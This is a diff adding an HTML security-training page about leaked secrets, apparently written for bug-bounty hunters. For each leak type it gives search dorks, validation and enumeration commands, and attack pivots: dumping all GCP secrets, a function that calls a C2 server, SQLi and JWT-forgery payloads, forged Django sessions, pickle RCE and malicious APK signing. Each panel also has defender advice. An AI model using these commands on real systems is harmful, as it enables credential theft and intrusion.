+    <h4>🛡️ Defender view</h4>
+    <ul>
+      <li>Never use long-term IAM user keys — use IAM Identity Center (SSO) with short-lived creds</li>
+      <li>Enable IAM Access Analyzer + GuardDuty — catches "access from unusual IP"</li>
+      <li>CloudTrail on all regions, not just us-east-1</li>
+      <li>Budget alerts — $50 above baseline = page someone</li>
+      <li>Rotate access keys quarterly; use <code>last_used_date</code> to find stale ones</li>
+    </ul>
+  </div>
+
+  <!-- ================== PANEL: GCP SA JSON ================== -->
+  <div class="leak-panel" id="panel-gcp">
+    <h3>🌩️ GCP service account JSON <span class="cvss-badge critical">CVSS 9.1</span> <span class="effort-meter">effort: <span class="dot on"></span><span class="dot on"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></span></h3>
+    <p class="lead">A JSON file with a private key for a Google Cloud service account. Downloaded once from GCP console, then… often committed.</p>
+
+    <h4>🔍 Step 1 — Discover</h4>
+    <div class="code">
+"type": "service_account" filename:*.json
+"private_key_id" "private_key" "client_email"
+"@&lt;project-id&gt;.iam.gserviceaccount.com"
+filename:*.json "service_account" "private_key"
+    </div>
+
+    <h4>✅ Step 2 — Validate</h4>
+    <div class="code safe">
+export GOOGLE_APPLICATION_CREDENTIALS=./stolen-sa.json
+gcloud auth activate-service-account --key-file=./stolen-sa.json
+
+<span class="com"># Identity check</span>
+gcloud auth list
+gcloud config list
+
+<span class="com"># What project does this SA live in?</span>
+jq -r '.project_id, .client_email' stolen-sa.json
+    </div>
+
+    <h4>🗺️ Step 3 — Enumerate</h4>
+    <div class="code">
+<span class="com"># List projects accessible</span>
+gcloud projects list
+
+<span class="com"># Permissions on the home project</span>
+gcloud projects get-iam-policy $(jq -r '.project_id' stolen-sa.json) \
+    --flatten="bindings[].members" \
+    --filter="bindings.members:$(jq -r '.client_email' stolen-sa.json)" \
+    --format="value(bindings.role)"
+
+<span class="com"># Resource-level scan</span>
+gcloud compute instances list
+gcloud storage buckets list
+gcloud secrets list          <span class="com"># 🎯 often the prize</span>
+gcloud sql instances list
+gcloud container clusters list  <span class="com"># GKE access?</span>
+    </div>
+
+    <h4>🔗 Step 4 — Pivot</h4>
+    <div class="kill-chain">
+      <div class="kill-step"><span class="num">PIVOT A</span><strong>Secret Manager dump</strong><br><code>for s in $(gcloud secrets list --format='value(name)'); do gcloud secrets versions access latest --secret=$s; done</code></div>
+      <div class="kill-step"><span class="num">PIVOT B</span><strong>Impersonate higher-priv SA</strong><br>If SA has <code>iam.serviceAccountTokenCreator</code> → <code>gcloud auth print-access-token --impersonate-service-account=admin@...</code></div>
+      <div class="kill-step"><span class="num">PIVOT C</span><strong>GKE takeover</strong><br><code>gcloud container clusters get-credentials</code> → now you have kubeconfig for the cluster (see kubeconfig panel)</div>
+      <div class="kill-step"><span class="num">PIVOT D</span><strong>Cloud Functions / Run → RCE</strong><br>Deploy a function that curls your C2, runs under the project's default SA (often over-privileged)</div>
+    </div>
+
+    <h4>🛡️ Defender view</h4>
+    <ul>
+      <li>Disable service account key creation entirely via Org Policy (<code>iam.disableServiceAccountKeyCreation</code>)</li>
+      <li>Use <strong>Workload Identity</strong> (GKE) or attached service accounts (GCE/Cloud Run) — no keys to leak</li>
+      <li>Short-lived credentials via <code>gcloud auth print-access-token --impersonate-service-account</code></li>
+      <li>Enable <strong>Sensitive Data Protection</strong> (DLP) scanning on Cloud Source Repositories</li>
+    </ul>
+  </div>
+
+  <!-- ================== PANEL: SCHEMA ================== -->
+  <div class="leak-panel" id="panel-schema">
+    <h3>🧬 schema.sql / Django migrations / Rails schema.rb <span class="cvss-badge medium">CVSS 5.3 (force multiplier)</span> <span class="effort-meter">effort: <span class="dot on"></span><span class="dot on"></span><span class="dot on"></span><span class="dot"></span><span class="dot"></span></span></h3>
+    <p class="lead">Not exploitable alone. But pair it with any future SQLi on the same app and you go from "fumbling in the dark" to "surgical extraction."</p>
+
+    <h4>🔍 Step 1 — Discover</h4>
+    <div class="code">
+<span class="com"># Dumps + migrations</span>
+extension:sql "CREATE TABLE" users
+extension:sql "INSERT INTO users"
+filename:schema.rb        <span class="com"># Rails</span>
+filename:schema.sql
+filename:0001_initial.py  <span class="com"># Django migrations</span>
+filename:*.dump extension:sql
+
+<span class="com"># ORM models (Django, SQLAlchemy, Sequelize, TypeORM)</span>
+filename:models.py class Meta
+extension:py models.Model password
+    </div>
+
+    <h4>✅ Step 2 — Validate relevance</h4>
+    <p>For a schema leak, "validation" = "does this match the target's current prod?":</p>
+    <div class="code safe">
+<span class="com"># If you also have any read access (even un-auth), compare column names</span>
+<span class="com"># E.g., a login form error leak:</span>
+curl -X POST https://target.com/login -d "email[]=x" -H "Content-Type: application/x-www-form-urlencoded"
+<span class="com"># → error: "column users.email_address does not exist" (Django debug mode)</span>
+<span class="com"># → if your schema says users.email_address, match confirmed</span>
+
+<span class="com"># Check git log dates — if schema hasn't moved in 2 years, probably still accurate</span>
+git log --oneline --all -- schema.sql
+    </div>
+
+    <h4>🗺️ Step 3 — Enumerate (turn the schema into a hit list)</h4>
+    <div class="code">
+<span class="com"># Rank tables by attacker value</span>
+grep -E "CREATE TABLE.*(user|admin|auth|session|token|payment|card|ssn|api_key|invite)" schema.sql
+
+<span class="com"># Column hunting — what data classes exist?</span>
+grep -E "(password|hash|token|secret|ssn|card_number|phone|dob)" schema.sql
+
+<span class="com"># Foreign keys reveal relationships</span>
+grep -E "REFERENCES" schema.sql
+<span class="com"># → payment_methods.user_id REFERENCES users(id) → user-to-payment linkage</span>
+    </div>
+
+    <h4>🔗 Step 4 — Pivot (the multi-year game)</h4>
+    <div class="kill-chain">
+      <div class="kill-step"><span class="num">PIVOT A</span><strong>Craft surgical SQLi payloads</strong><br>You don't need blind SQLi + long enumeration. You go straight to <code>UNION SELECT email, password_hash FROM users WHERE is_admin=true</code></div>
+      <div class="kill-step"><span class="num">PIVOT B</span><strong>Predict GraphQL / API shapes</strong><br>GraphQL schemas mirror DB schemas. Guess queries: <code>{ users(where: {isAdmin: true}) { email passwordHash } }</code></div>
+      <div class="kill-step"><span class="num">PIVOT C</span><strong>IDOR target selection</strong><br>Schema reveals <code>user.billing_address_id</code> is sequential INT → test <code>/billing/123</code> to <code>/billing/1234</code> for auth bypass</div>
+      <div class="kill-step"><span class="num">PIVOT D</span><strong>Mass assignment payloads</strong><br>Schema shows <code>is_admin</code> column exists → test POST /signup with <code>{"email":"x","is_admin":true}</code></div>
+    </div>
+
+    <h4>🛡️ Defender view</h4>
+    <ul>
+      <li>Schemas are "less sensitive but not non-sensitive" — treat them as internal-only, not open-source</li>
+      <li>Parameterize ALL queries (kills SQLi regardless of schema knowledge)</li>
+      <li>Use allow-lists for GraphQL introspection in prod</li>
+      <li>Django: <code>DEBUG=False</code> in prod (prevents column-name leaks in errors)</li>
+      <li>Strong IDOR checks independent of ID predictability</li>
+    </ul>
+  </div>
+
+  <!-- ================== PANEL: BASH HISTORY ================== -->
+  <div class="leak-panel" id="panel-bashhist">
+    <h3>📜 .bash_history <span class="cvss-badge high">CVSS 8.0</span> <span class="effort-meter">effort: <span class="dot on"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></span></h3>
+    <p class="lead">Every command the dev typed. Hostnames, passwords, tokens via <code>curl -H "Authorization: Bearer..."</code>, the works.</p>
+
+    <h4>🔍 Step 1 — Discover</h4>
+    <div class="code">
+filename:.bash_history
+filename:.zsh_history
+filename:.psql_history
+filename:.mysql_history
+filename:.python_history
+filename:.node_repl_history
+filename:.lesshst
+    </div>
+
+    <h4>🗺️ Step 2 — Mine it</h4>
+    <div class="code">
+<span class="com"># Credentials directly in commands (the classic: `mysql -p"password"`)</span>
+grep -iE "(password|passwd|pwd)=|-p[A-Z0-9]" .bash_history
+grep -iE "(mysql|psql|redis-cli|mongosh)" .bash_history
+
+<span class="com"># Bearer tokens from curl</span>
+grep -E "Authorization:|Bearer |api-key" .bash_history
+
+<span class="com"># SSH targets (internal hostnames)</span>
+grep -E "^ssh |^scp " .bash_history | awk '{print $NF}' | sort -u
+
+<span class="com"># AWS / GCP / Azure profile switches — reveals what clouds they touch</span>
+grep -E "^(aws|gcloud|az) " .bash_history
+
+<span class="com"># Git remotes (reveals private repos they access)</span>
+grep -E "git clone " .bash_history
+
+<span class="com"># File paths that contain secrets</span>
+grep -E "\.env|id_rsa|\.pem|credentials" .bash_history
+    </div>
+
+    <h4>🔗 Step 3 — Pivot</h4>
+    <div class="kill-chain">
+      <div class="kill-step"><span class="num">PIVOT A</span><strong>Replay the commands</strong><br>Sometimes an auth token in a <code>curl</code> command is still valid weeks later</div>
+      <div class="kill-step"><span class="num">PIVOT B</span><strong>Hostname enumeration</strong><br>Internal hostnames from <code>ssh</code> commands → targets for further attack</div>
+      <div class="kill-step"><span class="num">PIVOT C</span><strong>Dev behavior mapping</strong><br>Know what tools they use → craft believable phishing ("I noticed you use ArgoCD, here's a fix for X")</div>
+    </div>
+
+    <h4>🛡️ Defender view</h4>
+    <ul>
+      <li>Add to <code>~/.bashrc</code>: <code>export HISTCONTROL=ignorespace; export HISTIGNORE="*password*:*secret*:*token*"</code></li>
+      <li>Always prefix sensitive commands with a SPACE → not saved to history</li>
+      <li>Use <code>--password-from-stdin</code> / password prompts, never inline args</li>
+      <li>Never commit dotfiles without review — use dedicated dotfile repos, not your project repo</li>
+    </ul>
+  </div>
+
+  <!-- ================== PANEL: COMMIT MSG ================== -->
+  <div class="leak-panel" id="panel-commitmsg">
+    <h3>💬 Commit messages <span class="cvss-badge medium">CVSS 6.5</span> <span class="effort-meter">effort: <span class="dot on"></span><span class="dot on"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></span></h3>
+    <p class="lead">The code fix was good. The commit message was the confession.</p>
+
+    <h4>🔍 Step 1 — Discover</h4>
+    <div class="code">
+<span class="com"># GitHub has no "commit message only" search — get creative</span>
+<span class="com"># Via GitHub REST</span>
+gh search commits "password fix" --repo target/repo --json sha,message
+
+<span class="com"># Hunting patterns (run locally after cloning)</span>
+git log --all --oneline | grep -iE "(password|secret|token|TODO|fixme|hack|temp|XXX|backdoor)"
+git log --all --format='%H %s' | grep -iE "(real password|actual secret|hardcoded|keep this)"
+    </div>
+
+    <h4>🗺️ Step 2 — Mine deeper</h4>
+    <div class="code">
+<span class="com"># Commit BODIES, not just subjects (subjects are short)</span>
+git log --all --format='%H%n%B%n---' | grep -B 2 -iE "(password|token|secret)"
+
+<span class="com"># Deleted commits still live in reflog + dangling commits</span>
+git fsck --lost-found
+git reflog show --all | head
+
+<span class="com"># Trigger a "find all strings in history"</span>
+git log --all -p | grep -iE "(API_KEY|SECRET|TOKEN|PASSWORD)" | head -30
+    </div>
+
+    <h4>🔗 Step 3 — Pivot</h4>
+    <div class="kill-chain">
+      <div class="kill-step"><span class="num">PIVOT A</span><strong>Confession → locate the leak</strong><br>"removing hardcoded password before prod" → check the DIFF of that commit → the password is in the removed lines</div>
+      <div class="kill-step"><span class="num">PIVOT B</span><strong>Feature announcements → new attack surface</strong><br>"adding admin backdoor for demo" → the backdoor code is in the commit; revert the revert</div>
+      <div class="kill-step"><span class="num">PIVOT C</span><strong>Dev workflow intel</strong><br>"deploy to prod after demo" → you now know deployment timing → attacks during deploy windows have maximum blast radius</div>
+    </div>
+
+    <h4>🛡️ Defender view</h4>
+    <ul>
+      <li>Pre-commit hook: reject commits with sensitive keywords (<code>trufflehog</code>, <code>gitleaks</code> in pre-commit mode)</li>
+      <li>PR template enforces short, sanitized messages; secrets never belong in messages</li>
+      <li>Git history rewrite — <code>git filter-repo --message-callback</code> can redact retroactively (but attacker may have already cloned)</li>
+    </ul>
+  </div>
+
+  <!-- ================== PANEL: EXPOSED .git FOLDER ================== -->
+  <div class="leak-panel" id="panel-gitfolder">
+    <h3>📂 Exposed <code>.git/</code> on a web server <span class="cvss-badge critical">CVSS 9.4</span> <span class="effort-meter">effort: <span class="dot on"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></span></h3>
+    <p class="lead">Not a GitHub leak — it's the <em>physical</em> <code>.git</code> folder uploaded to <code>/var/www/</code> on a live web server. Entire repo history downloadable via HTTP.</p>
+
+    <h4>🔍 Step 1 — Discover</h4>
+    <div class="code">
+<span class="com"># Manual check on any target</span>
+curl -s -o /dev/null -w "%{http_code}\n" https://target.com/.git/config
+<span class="com"># 200 = JACKPOT. 403 = hidden-but-configured. 404 = safe.</span>
+
+<span class="com"># Mass scan (for CTFs / bug bounty recon on your own targets)</span>
+httpx -l domains.txt -path "/.git/config" -mc 200 -silent
+
+<span class="com"># Shodan / Google dorks</span>
+"Index of /.git"
+intitle:"Index of" ".git/config"
+    </div>
+
+    <h4>✅ Step 2 — Validate</h4>
+    <div class="code safe">
+<span class="com"># Is it a complete repo or just stray files?</span>
+curl -s https://target.com/.git/HEAD          <span class="com"># should show: ref: refs/heads/main</span>
+curl -s https://target.com/.git/config        <span class="com"># remote URL, sometimes credentials</span>
+curl -s https://target.com/.git/description   <span class="com"># mostly ignorable</span>
+    </div>
+
+    <h4>🗺️ Step 3 — Dump the repo</h4>
+    <div class="code">
+<span class="com"># git-dumper — the tool for this</span>
+pip install git-dumper
+git-dumper https://target.com/.git ./dumped-repo
+
+<span class="com"># Alternative: githacker</span>
+githacker --url https://target.com/.git --output-folder ./dumped
+
+<span class="com"># Now explore as if it's a local repo</span>
+cd dumped-repo
+git log --all --oneline
+git show HEAD
+grep -rIE "(password|api_key|secret)" .
+    </div>
+
+    <h4>🔗 Step 4 — Pivot</h4>
+    <div class="kill-chain">
+      <div class="kill-step"><span class="num">PIVOT A</span><strong>Source → logic bugs</strong><br>Read the code. Find SQLi, IDOR, auth bypass that would take hours via blackbox testing</div>
+      <div class="kill-step"><span class="num">PIVOT B</span><strong>Git config → git credentials</strong><br><code>.git/config</code> sometimes has <code>url = https://user:token@github.com/...</code></div>
+      <div class="kill-step"><span class="num">PIVOT C</span><strong>Deleted files recovered</strong><br><code>git log --all --full-history --diff-filter=D --name-only</code> → find deleted files → <code>git show &lt;commit&gt;:/path/to/deleted/.env</code></div>
+    </div>
+
+    <h4>🛡️ Defender view</h4>
+    <ul>
+      <li>Never deploy with <code>.git/</code> present. CI/CD should build artifacts, <code>rsync --exclude=.git</code>, etc.</li>
+      <li>Web server config: explicitly deny <code>location ~ /\.git { deny all; return 404; }</code> in nginx</li>
+      <li>Periodic scan of your own sites for exposed <code>.git</code>, <code>.env</code>, <code>.svn</code>, <code>.DS_Store</code></li>
+    </ul>
+  </div>
+
+  <!-- ================== PANEL: DJANGO SECRET_KEY ================== -->
+  <div class="leak-panel" id="panel-djangokey">
+    <h3>🐍 Django <code>SECRET_KEY</code> (or Rails <code>secret_key_base</code>, Flask <code>SECRET_KEY</code>) <span class="cvss-badge critical">CVSS 9.8</span> <span class="effort-meter">effort: <span class="dot on"></span><span class="dot on"></span><span class="dot on"></span><span class="dot"></span><span class="dot"></span></span></h3>
+    <p class="lead">The framework's signing key. Leak it and you forge any signed cookie / token / password reset link.</p>
+
+    <h4>🔍 Step 1 — Discover</h4>
+    <div class="code">
+"SECRET_KEY = " extension:py django
+"secret_key_base" extension:rb
+"SECRET_KEY" extension:env
+"django-insecure-"     <span class="com"># Django's default dev prefix, often forgotten in prod</span>
+
+<span class="com"># Flask app.config</span>
+"app.config['SECRET_KEY']"
+"app.secret_key = "
+    </div>
+
+    <h4>✅ Step 2 — Validate</h4>
+    <div class="code safe">
+<span class="com"># You need a session cookie to test. Get one by visiting the site.</span>
+curl -c cookies.txt https://target.com/
+
+<span class="com"># Django: the sessionid cookie is base64(JSON).sig  — verify we can resign</span>
+<span class="com"># Use django-signature-tool or write a small script</span>
+python3 -c "
+from django.core.signing import TimestampSigner
+s = TimestampSigner(key='LEAKED_SECRET_KEY')
+# If we can verify an existing session, the key is valid
+print(s.unsign('existing-session-cookie'))
+"
+    </div>
+
+    <h4>🗺️ Step 3 — Enumerate</h4>
+    <p>Django <code>SECRET_KEY</code> is used for MANY things:</p>
+    <ul>
+      <li>Session cookies (<code>sessionid</code>) — if signed session engine</li>
+      <li>Password reset tokens</li>
+      <li>CSRF tokens</li>
+      <li>Default signing of any data via <code>django.core.signing</code></li>
+      <li>Messages framework cookies</li>
+      <li><code>pickle</code> deserialization in signed cookies = <strong>RCE</strong> if the app uses <code>PickleSerializer</code></li>
+    </ul>
+
+    <h4>🔗 Step 4 — Pivot</h4>
+    <div class="kill-chain">
+      <div class="kill-step"><span class="num">PIVOT A</span><strong>Forge a session as admin</strong><br>Craft a session cookie with <code>_auth_user_id = 1</code> (first user, usually admin) + sign with leaked key → set cookie → log in</div>
+      <div class="kill-step"><span class="num">PIVOT B</span><strong>Forge password reset for any user</strong><br>Generate a valid reset token for <code>admin@site.com</code> → visit the URL → reset their password → log in</div>
+      <div class="kill-step"><span class="num">PIVOT C</span><strong>Pickle deserialization RCE</strong><br>If the app uses <code>SESSION_SERIALIZER='django.contrib.sessions.serializers.PickleSerializer'</code> (deprecated but alive in older apps) → inject a malicious pickle in the cookie → RCE on page load. See CVE-2018-1000805 for pattern.</div>
+    </div>
+
+    <h4>🛡️ Defender view</h4>
+    <ul>
+      <li>Never commit <code>SECRET_KEY</code>. Read from env var, use <code>django-environ</code></li>
+      <li>Rotate <code>SECRET_KEY</code> immediately on leak. Users will be logged out — accept it</li>
+      <li>Use <code>JSONSerializer</code> for sessions (default since Django 1.6, but check legacy apps)</li>
+      <li>Sentinel value check: <code>django-insecure-</code> prefix in prod = someone shipped the default</li>
+    </ul>
+  </div>
+
+  <!-- ================== PANEL: JWT ================== -->
+  <div class="leak-panel" id="panel-jwt">
+    <h3>🎟️ JWTs in test files / docs / commits <span class="cvss-badge high">CVSS 7.5 (context-dependent)</span> <span class="effort-meter">effort: <span class="dot on"></span><span class="dot on"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></span></h3>
+    <p class="lead">Devs paste "real" JWTs into test fixtures, Postman collections, or README examples. If the signing key hasn't rotated, the token may still validate.</p>
+
+    <h4>🔍 Step 1 — Discover</h4>
+    <div class="code">
+<span class="com"># JWTs have a distinctive 3-segment base64 pattern</span>
+"eyJhbGci"
+"eyJ0eXAiOiJKV1Q"
+
+<span class="com"># Often in tests</span>
+filename:*.test.js "eyJ"
+filename:*_test.py "eyJ"
+filename:fixtures "eyJ"
+    </div>
+
+    <h4>✅ Step 2 — Decode + validate</h4>
+    <div class="code safe">
+<span class="com"># Decode header + payload (the signature is base64url)</span>
+echo "eyJhbGci..." | cut -d. -f1 | base64 -d
+echo "eyJhbGci..." | cut -d. -f2 | base64 -d
+
+<span class="com"># Or use jwt.io / jwt_tool.py</span>
+python3 -m jwt_tool "eyJhbGci..." -M pb   <span class="com"># playbook mode</span>
+
+<span class="com"># Test if it's still accepted</span>
+curl -H "Authorization: Bearer eyJhbGci..." https://target.com/api/me
+<span class="com"># 200 = still valid, 401 = rotated/expired</span>
+    </div>
+
+    <h4>🗺️ Step 3 — Look at the claims</h4>
+    <div class="code">
+<span class="com"># Useful claims to read</span>
+sub      <span class="com"># subject = usually user ID</span>
+iss      <span class="com"># issuer = auth server URL (tells you their stack)</span>
+aud      <span class="com"># audience = which API it's for</span>
+exp      <span class="com"># expiration — if far future, it's a long-lived token</span>
+iat      <span class="com"># issued-at</span>
+scope    <span class="com"># OAuth-style scopes</span>
+kid      <span class="com"># key id — reveals if they use key rotation</span>
+    </div>
+
+    <h4>🔗 Step 4 — Pivot</h4>
+    <div class="kill-chain">
+      <div class="kill-step"><span class="num">PIVOT A</span><strong>Token still valid → impersonate the user</strong><br>Straight use: <code>Authorization: Bearer &lt;token&gt;</code></div>
+      <div class="kill-step"><span class="num">PIVOT B</span><strong>Algorithm confusion (<code>alg: none</code>)</strong><br>Change header to <code>{"alg":"none"}</code>, remove signature. Some libraries STILL accept this.</div>
+      <div class="kill-step"><span class="num">PIVOT C</span><strong>RS256 → HS256 confusion</strong><br>If the public key is exposed (often in <code>/.well-known/jwks.json</code>), change <code>alg</code> to HS256 and sign with the public key as HMAC secret</div>
+      <div class="kill-step"><span class="num">PIVOT D</span><strong>Weak HS256 key brute force</strong><br><code>hashcat -m 16500 token.txt wordlist.txt</code> — if the signing secret is weak (<code>secret</code>, <code>changeme</code>), you crack it, then sign anything</div>
+      <div class="kill-step"><span class="num">PIVOT E</span><strong>JKU/X5U header injection</strong><br>Some libs fetch JWKs from a URL in the header → make it point to your server → serve your own public key → they validate against it</div>
+    </div>
+
+    <h4>🛡️ Defender view</h4>
+    <ul>
+      <li>Use a strong signing key (256+ bits random)</li>
+      <li>Pin algorithm in verifier: <code>jwt.verify(token, key, {algorithms: ['RS256']})</code> — never accept <code>alg: none</code></li>
+      <li>Short expiration (15 min) + refresh tokens</li>
+      <li>NEVER put real JWTs in test fixtures. Use dedicated test keys.</li>
+      <li>Rotate keys periodically via <code>kid</code> header</li>
+    </ul>
+  </div>
+
+  <!-- ================== PANEL: POSTMAN ================== -->
+  <div class="leak-panel" id="panel-postman">
+    <h3>📫 Postman / Insomnia collections <span class="cvss-badge high">CVSS 8.1</span> <span class="effort-meter">effort: <span class="dot on"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></span></h3>
+    <p class="lead">Exported API collection JSONs. Often baked-in auth tokens, internal endpoints, example requests with real data.</p>
+
+    <h4>🔍 Step 1 — Discover</h4>
+    <div class="code">
+<span class="com"># Postman exports</span>
+filename:*.postman_collection.json
+"_postman_id" "_postman_collection_id"
+
+<span class="com"># Environments (where tokens usually live)</span>
+filename:*.postman_environment.json
+"values" "currentValue" postman
+
+<span class="com"># Insomnia</span>
+filename:*.insomnia.json
+
+<span class="com"># Public Postman Workspaces (underrated surface)</span>
+<span class="com"># Use postman.com search — go to Explore → search by company name</span>
+https://www.postman.com/search?q=target-company
+    </div>
+
+    <h4>🗺️ Step 2 — Mine the collection</h4>
+    <div class="code">
+<span class="com"># Extract all URLs (internal endpoints!)</span>
+jq -r '.. | .url? | select(.) | .raw? // .' collection.json | sort -u
+
+<span class="com"># Extract all headers (auth tokens hide here)</span>
+jq -r '.. | .header? | select(.) | .[]? | "\(.key): \(.value)"' collection.json | grep -i auth
+
+<span class="com"># Extract environment variables</span>
+jq -r '.values[] | "\(.key)=\(.value)"' environment.json
+<span class="com"># → api_token=eyJ..., staging_url=https://staging.internal, ...</span>
+    </div>
+
+    <h4>🔗 Step 3 — Pivot</h4>
+    <div class="kill-chain">
+      <div class="kill-step"><span class="num">PIVOT A</span><strong>Internal API discovery</strong><br>Endpoints you'd never find via external enumeration (<code>/api/internal/admin/impersonate</code>)</div>
+      <div class="kill-step"><span class="num">PIVOT B</span><strong>Tokens in environments</strong><br>Baked-in <code>Authorization: Bearer ...</code> headers — try them live</div>
+      <div class="kill-step"><span class="num">PIVOT C</span><strong>API shape leak</strong><br>Request/response examples reveal data structures → craft mass-assignment or IDOR payloads</div>
+      <div class="kill-step"><span class="num">PIVOT D</span><strong>Pre-request scripts</strong><br>Postman collections sometimes embed JavaScript that calls an auth endpoint with baked-in creds — instant token-generation oracle</div>
+    </div>
+
+    <h4>🛡️ Defender view</h4>
+    <ul>
+      <li>Never export environments with real values — use "Current Value" vs "Initial Value" split</li>
+      <li>Company Postman workspaces should be private</li>
+      <li>Use Postman's built-in secret management (not plain env vars) for shared collections</li>
+      <li>Audit your org's public Postman workspaces quarterly</li>
+    </ul>
+  </div>
+
+  <!-- ================== PANEL: ANDROID KEYSTORE ================== -->
+  <div class="leak-panel" id="panel-keystore">
+    <h3>📱 Android keystore + build.gradle passwords <span class="cvss-badge critical">CVSS 9.1</span> <span class="effort-meter">effort: <span class="dot on"></span><span class="dot on"></span><span class="dot on"></span><span class="dot"></span><span class="dot"></span></span></h3>
+    <p class="lead">An attacker with your app-signing keystore can push a malicious update that every user's phone will accept as legitimate. The supply-chain nightmare.</p>
+
+    <h4>🔍 Step 1 — Discover</h4>
+    <div class="code">
+filename:*.keystore
+filename:*.jks
+filename:release.keystore
+filename:keystore.properties
+
+<span class="com"># The password file that usually lives next to it</span>
+filename:build.gradle storePassword
+filename:keystore.properties storePassword
+filename:local.properties KEY_PASSWORD
+    </div>
+
+    <h4>✅ Step 2 — Validate</h4>
+    <div class="code safe">
+<span class="com"># List the aliases (no modification)</span>
+keytool -list -v -keystore release.keystore -storepass "LEAKED_PASSWORD"
+
+<span class="com"># You'll see:</span>
+<span class="com">#   Alias name: app_release</span>
+<span class="com">#   Owner: CN=Target Company, OU=Mobile, O=Target, L=NYC, ST=NY, C=US</span>
+<span class="com">#   Valid from: 2020-03-14 until: 2045-03-08</span>
+<span class="com">#   Certificate fingerprints:</span>
+<span class="com">#     SHA256: AB:CD:EF:...</span>
+
+<span class="com"># Compare the SHA256 against the live Play Store listing (via apkpure / aapt)</span>
+aapt dump badging app.apk | grep "application:"
+apksigner verify --print-certs app.apk
+<span class="com"># If the fingerprint matches → this keystore signs the live app → CRITICAL</span>
+    </div>
+
+    <h4>🔗 Step 3 — Pivot</h4>
+    <div class="kill-chain">
+      <div class="kill-step"><span class="num">PIVOT A</span><strong>Malicious update push (supply chain)</strong><br>Sign a modified APK with the leaked keystore → users side-loading get the fake version silently. Play Store is harder (requires Play Console credentials too) but third-party stores (Amazon, Huawei, F-Droid forks) often accept signed APKs</div>
+      <div class="kill-step"><span class="num">PIVOT B</span><strong>Impersonation of company identity</strong><br>The signing cert's CN is the legal identity the OS uses. You can publish APKs that appear to come from the company on any non-Play store</div>
+      <div class="kill-step"><span class="num">PIVOT C</span><strong>Signature-verified IPC abuse</strong><br>Android apps sometimes trust other apps based on "same signing key." If both apps from target company use same keystore → signing it lets you create a 3rd app that bypasses those checks</div>
+    </div>
+
+    <h4>🛡️ Defender view</h4>
+    <ul>
+      <li>NEVER commit keystores or keystore passwords. Gradle: read from env vars, CI secret stores</li>
+      <li>Use Play App Signing (Google holds the upload key for you)</li>
+      <li>If leaked: you cannot rotate a signing key on Play without upgrading to Play App Signing. Plan carefully. Consider publishing a warning + new app</li>
+      <li>Separate upload key (for submitting to Play) from signing key (which Google holds) — upload key leak is recoverable, signing key leak isn't</li>
+    </ul>
+  </div>
+</section>
+
+<div class="divider">the mental model</div>
+
+<!-- ================== CLOSING ================== -->
+<section class="chapter" id="closing">
+  <div class="chapter-num">Chapter 99 // Closing the loop</div>
+  <h2><span class="emoji">🎯</span> The one-sentence red-team framework</h2>
+
+  <div class="paper">
+    <h4>📝 Remember this. Tattoo it on your brain.</h4>
+    <p><strong>Every leak is asking two questions:</strong></p>
+    <p>1. <span class="highlight">What does this DIRECTLY unlock?</span> (the blast radius)<br>
+    2. <span class="highlight">What can the blast-radius find ME next?</span> (the pivot)</p>
+    <p>Senior red teamers only care about question 2. Because question 1 is junior work (the vendor's validation API answers it for you). Question 2 is where the chain happens — where 1 leaked .env leads to 5 stolen accounts leads to a database dump leads to source code leads to… the headline breach.</p>
+  </div>
+
+  <div class="callout success">
+    <strong>☕ The ethical wrap:</strong> You already catch leaks at scale — that's your superpower. These walkthroughs are so you understand <em>how dangerous the thing you're finding actually is</em>. When you message a repo owner "you leaked an AWS key," you now know that a real attacker has a 5-step chain ready to turn it into a $50K crypto-mining bill. That specificity makes your disclosure emails 10x more persuasive. "Your key is public" is junior framing. "Your key leads to your RDS which leads to your users' PII" is senior framing. Same info, very different urgency.
+  </div>
+
+  <div class="quiz">
+    <h4>🎯 Final Check — did you internalize the framework?</h4>
+    <div class="q">An attacker finds a valid <code>sk_live_...</code> Stripe key in a public GitHub repo. What's the SENIOR red-team next step?</div>
+    <div class="options">
+      <div class="opt" onclick="quizAnswer(this, false)">Immediately use the key to refund themselves a million dollars.</div>
+      <div class="opt" onclick="quizAnswer(this, false)">Ignore Stripe and hunt for AWS keys instead — Stripe keys are low-value.</div>
+      <div class="opt" onclick="quizAnswer(this, true)">Validate with a boring <code>GET /v1/account</code>, enumerate scope (is it <code>sk_live_</code> or a restricted <code>rk_live_</code>?), then PIVOT — look for what else the same developer leaked: webhook URLs revealing infra, customer_id ranges hinting at DB size, linked API keys in the same account.</div>
+      <div class="opt" onclick="quizAnswer(this, false)">Only useful if paired with database credentials — Stripe alone does nothing.</div>
+    </div>
+    <div class="feedback"></div>
+  </div>
+</section>
+
+<section class="chapter">
+  <div class="related-terms">
+    <h4>🔗 Related in the vault</h4>
+    <div class="tags">
+      <a href="index.html">🗑️ Leaky Commits (main)</a>
+      <a href="../../../glossary/env-file.html">📄 .env file</a>
+      <a href="../../../glossary/tfstate.html">🗺️ terraform.tfstate</a>
+      <a href="../../../glossary/kubeconfig.html">☸️ kubeconfig</a>
+      <a href="../../../glossary/ssh.html">🔐 SSH</a>
+      <a href="../../../glossary/privilege-escalation.html">🔝 Privilege Escalation</a>
+      <a href="../../../glossary/bug-bounty.html">🐛 Bug Bounty</a>
+    </div>
+  </div>
+</section>
+
+<footer class="site-foot">
+  <p class="coffee-line">Find leaks. Understand their blast radius. Warn the owner. Build a 6-figure career. ☕</p>
+</footer>
+
+<script src="../../../assets/glossary.js"></script>
+<script src="../../../assets/app.js"></script>
+<script>
+  /* Tab switcher */
+  document.querySelectorAll('#leakTabs .leak-tab').forEach(tab => {
+    tab.addEventListener('click', () => {
+      const panel = tab.dataset.panel;
+      document.querySelectorAll('#leakTabs .leak-tab').forEach(t => t.classList.toggle('active', t === tab));
+      document.querySelectorAll('.leak-panel').forEach(p => p.classList.toggle('active', p.id === 'panel-' + panel));
+      // update URL hash for deep-linking
+      history.replaceState(null, '', '#leak-' + panel);
+      // scroll the panel into view on mobile
+      document.getElementById('leaks').scrollIntoView({behavior: 'smooth', block: 'start'});
+    });
+  });
+
+  /* Deep-link support: if URL has #leak-xxx, open that tab */
+  (function() {
+    const m = location.hash.match(/^#leak-(.+)/);
